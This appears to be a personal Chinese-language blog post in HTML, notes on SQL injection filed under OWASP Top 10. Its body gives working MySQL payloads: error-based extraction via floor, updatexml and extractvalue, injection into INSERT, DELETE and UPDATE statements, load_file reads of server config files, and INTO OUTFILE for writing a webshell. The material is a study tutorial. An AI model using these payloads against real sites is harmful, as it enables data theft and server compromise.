@@ -1,0 +1,416 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="介绍1首先什么是sql注入，sql注入是恶意用户将恶意的sql语句提交给服务端，并且带入数据库进行查询最终爆出各种数据的攻击手段">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql注入篇">
+<meta property="og:url" content="http://example.com/2020/10/10/sql%E6%B3%A8%E5%85%A5%E7%AF%87/index.html">
+<meta property="og:site_name" content="Navi Bar">
+<meta property="og:description" content="介绍1首先什么是sql注入，sql注入是恶意用户将恶意的sql语句提交给服务端，并且带入数据库进行查询最终爆出各种数据的攻击手段">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2020-10-10T00:39:39.000Z">
+<meta property="article:modified_time" content="2020-10-10T01:36:29.643Z">
+<meta property="article:author" content="f1oat">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/2020/10/10/sql%E6%B3%A8%E5%85%A5%E7%AF%87/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>sql注入篇 | Navi Bar</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Navi Bar</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">2</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">1</span></a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2020/10/10/sql%E6%B3%A8%E5%85%A5%E7%AF%87/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="f1oat">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Navi Bar">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          sql注入篇
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2020-10-10 08:39:39 / Modified: 09:36:29" itemprop="dateCreated datePublished" datetime="2020-10-10T08:39:39+08:00">2020-10-10</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/owsap-top10/" itemprop="url" rel="index"><span itemprop="name">owsap top10</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">首先什么是sql注入，sql注入是恶意用户将恶意的sql语句提交给服务端，并且带入数据库进行查询最终爆出各种数据的攻击手段</span><br></pre></td></tr></table></figure>
+<a id="more"></a>
+
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><ol>
+<li>拥有可控的变量，例如get查询的id等</li>
+<li>可控的变量带入了数据库查询</li>
+<li>变量没有过滤或者过滤不严格导致了sql语句能够带入数据库查询</li>
+</ol>
+<h2 id="具体危害"><a href="#具体危害" class="headerlink" title="具体危害"></a>具体危害</h2><ol>
+<li>数据库数据泄露导致后台被控制-&gt;导致web权限被控制-&gt;导致服务器权限被控制</li>
+<li>文件操作 如：写入shell，读取文件源码</li>
+</ol>
+<h2 id="注入发现和利用"><a href="#注入发现和利用" class="headerlink" title="注入发现和利用"></a>注入发现和利用</h2><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">由于sql注入属于web应用，发现的话可以采用web扫描器或手工检测</span><br><span class="line">常用sqlmap</span><br></pre></td></tr></table></figure>
+
+<h2 id="sql注入的攻击方式"><a href="#sql注入的攻击方式" class="headerlink" title="sql注入的攻击方式"></a>sql注入的攻击方式</h2><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. 数据库类型:mysql,sqlite,oracle,access,postgresql,....</span><br><span class="line">2. 参数传递提交的方式，get，post，cookie，delete，insert....</span><br><span class="line">3. sql注入分类:盲注，sql查询类型等</span><br></pre></td></tr></table></figure>
+<h3 id="mysql注入"><a href="#mysql注入" class="headerlink" title="mysql注入"></a>mysql注入</h3><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql数据库的结构分层</span><br><span class="line">    1.库名，表名，列名，数据库用户等</span><br><span class="line">        mysql自带的 </span><br><span class="line">            information_schema.schemata 管理所有数据库名信息的表</span><br><span class="line">            information_schema.tables   管理所有数据库内表名信息的表</span><br><span class="line">            information_schema.columns  管理所有数据库内表字段名信息的表</span><br><span class="line">        数据库用户:</span><br><span class="line">            root和普通用户权限</span><br><span class="line">            root可跨库查询以及对文件进行读写操作</span><br><span class="line">    2.数据库与web应用相结合的架构关系</span><br><span class="line">        client &lt;-&gt; server &lt;-&gt; databases</span><br></pre></td></tr></table></figure>
+
+<h4 id="具体注入的姿势"><a href="#具体注入的姿势" class="headerlink" title="具体注入的姿势"></a>具体注入的姿势</h4><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">mysql基本注入流程</span><br><span class="line">   mysqk基本注入拓展</span><br><span class="line">   mysql注入权限</span><br><span class="line">   1.普通用户注入攻击</span><br><span class="line">       只能靠猜数据进行安全测试</span><br><span class="line">   2.root跨库注入，文件操作</span><br><span class="line">   @@version_compile_os 查询操作系统</span><br><span class="line">   由数据库进行连接的用户决定，谁连接就是谁的权限</span><br><span class="line">   3.sql注入写入文件</span><br><span class="line">       举例:id=-1&#x27;union select null,&#x27;aaa&#x27;,null,null into outfile(&quot;D:<span class="tag">\<span class="name">\</span></span>WWW<span class="tag">\<span class="name">\</span></span>1.txt&quot;)</span><br><span class="line">       aaa可以替换成shell代码，保存的文件可以换成shell.php 高危</span><br><span class="line">       有一个关键问题写入shell的时候你需要获取到网站的绝对路径否则无法用菜刀连接shell，写入的shell就没有意义</span><br><span class="line">       路径获取方法:</span><br><span class="line">               1.报错，有些网站报错的时候会带出路径的信息</span><br><span class="line">               2.phpinfo泄露网站绝对路径 script_filename 暴露绝对路径</span><br><span class="line">               3.查找漏洞信息爆路径</span><br><span class="line">               4.其他方法获取路径sql注入利用load_file()读取某些web容器的配置文件就能够获取网站的绝对路径</span><br><span class="line">                   select null,load_file(&#x27;dir<span class="tag">\<span class="name">filename</span></span>&#x27;),null,nulll</span><br><span class="line">                   iis6.0 C:<span class="tag">\<span class="name">Windows</span></span>/system32<span class="tag">\<span class="name">inetsrv</span></span><span class="tag">\<span class="name">metabase</span></span>.xml</span><br><span class="line">                   ii7.5 C:<span class="tag">\<span class="name">Windows</span></span><span class="tag">\<span class="name">System</span></span>32<span class="tag">\<span class="name">inetsrv</span></span><span class="tag">\<span class="name">config</span></span><span class="tag">\<span class="name">applicationHost</span></span>.config</span><br><span class="line">                   apache</span><br><span class="line">   mysql宽字节注入:</span><br><span class="line">       宽字节注入是利用mysql的一个特性，mysql在使用GBK编码的时候，会认为两个字符是一个汉字（前一个ASCII码要大于128，才到汉字的范围）</span><br><span class="line">   </span><br><span class="line">   无回显报错注入</span><br><span class="line">       floor报错:</span><br><span class="line">           payload:</span><br><span class="line">               ?id=1&#x27;+and+(select+1+from(select+count(*),concat(version(),floor(rand(0)*2))x+from+information_schema.tables+group+by+x)a)--+</span><br><span class="line">               ?id=-1&#x27; and(select 1 from (select count(*),concat((select table_name from information_schema.tables limit 3,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span><br><span class="line">       updatexml报错:</span><br><span class="line">           updatexml()函数是mysql对xml文档上数据进行查询和修改的xpath函数，但是updatexml只能爆出32位的数据</span><br><span class="line">           payload:</span><br><span class="line">               id=1&#x27;and 1=(updatexml(1,concat(0x3a,(select version())),1))--+</span><br><span class="line">               对select version进行修改爆破数据</span><br><span class="line">       extractvalue报错:</span><br><span class="line">           payload:</span><br><span class="line">               id=1&#x27; and extractvalue(1,concat(0x73,user()))--+</span><br><span class="line">               对user()修改爆破数据</span><br><span class="line">   其他注入</span><br><span class="line">       select</span><br><span class="line">       insert</span><br><span class="line">           insert注入常和报错联系在一起 insert into table_name (id,username,password)values(id,&#x27;xxx&#x27; or updatexml(1,concat(0x7e,(version())),0) or &#x27;&#x27;,&#x27;xxx&#x27;);</span><br><span class="line">           insert into users(id,username,password)values(16,&#x27;oracle&#x27; or updatexml(1,concat(0x7e,(version())),0)or &#x27;&#x27;,&#x27;xxx&#x27;);</span><br><span class="line">           insert into users(id,username,password)values(16,&#x27;oracle&#x27; or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema = database() limit 0,1)),0)or &#x27;&#x27;,&#x27;xxx&#x27;);</span><br><span class="line">           因为updatexml报错只能回显32位的错误</span><br><span class="line">           还可以用extractvalue报错</span><br><span class="line">           insert into users(id,username,password)values(2,&#x27;float&#x27; or extractvalue(1,concat(0x7e,database())) or &#x27;&#x27;,&#x27;xxx&#x27;);</span><br><span class="line">       delete</span><br><span class="line">           后台管理里删除文章删除用户等操作</span><br><span class="line">           delete from users where id=1 or extractvalue(1,concat(0x7e,database())) or &#x27;&#x27;;</span><br><span class="line">       update</span><br><span class="line">       update users set password=&#x27;Nicky&#x27; or extractvalue(1,concat(0x7e,database())) or &#x27;&#x27;;</span><br><span class="line">           数据同步缓存等操作</span><br></pre></td></tr></table></figure>
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/10/08/index/" rel="prev" title="Welcome to my blog">
+      <i class="fa fa-chevron-left"></i> Welcome to my blog
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%8B%E7%BB%8D"><span class="nav-number">1.</span> <span class="nav-text">介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-number">2.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%B7%E4%BD%93%E5%8D%B1%E5%AE%B3"><span class="nav-number">3.</span> <span class="nav-text">具体危害</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E5%8F%91%E7%8E%B0%E5%92%8C%E5%88%A9%E7%94%A8"><span class="nav-number">4.</span> <span class="nav-text">注入发现和利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sql%E6%B3%A8%E5%85%A5%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F"><span class="nav-number">5.</span> <span class="nav-text">sql注入的攻击方式</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#mysql%E6%B3%A8%E5%85%A5"><span class="nav-number">5.1.</span> <span class="nav-text">mysql注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%B7%E4%BD%93%E6%B3%A8%E5%85%A5%E7%9A%84%E5%A7%BF%E5%8A%BF"><span class="nav-number">5.1.1.</span> <span class="nav-text">具体注入的姿势</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">f1oat</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">2</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">f1oat</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+
+</body>
+</html>
